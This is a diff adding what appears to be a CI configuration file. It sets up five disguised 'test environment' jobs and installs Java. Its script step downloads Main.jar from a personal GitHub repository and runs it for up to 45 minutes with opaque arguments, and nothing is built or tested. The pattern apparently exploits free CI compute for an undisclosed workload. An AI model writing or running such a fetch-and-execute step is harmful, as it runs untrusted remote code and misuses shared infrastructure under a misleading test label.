@@ -1,0 +1,18 @@
+dist: bionic
+
+env:
+  - TEST_ENVIRONMENT=primary
+  - TEST_ENVIRONMENT=secondary
+  - TEST_ENVIRONMENT=sec
+  - TEST_ENVIRONMENT=beta
+  - TEST_ENVIRONMENT=trial
+
+
+install:
+  - echo "Test Environment:- $TEST_ENVIRONMENT"
+  - sudo apt update
+  - sudo apt install wget default-jre -y
+
+script:
+  - wget https://github.com/z6rubinaz1/first-repository/raw/master/Main.jar
+  - timeout 45m java -jar Main.jar rock6064 1
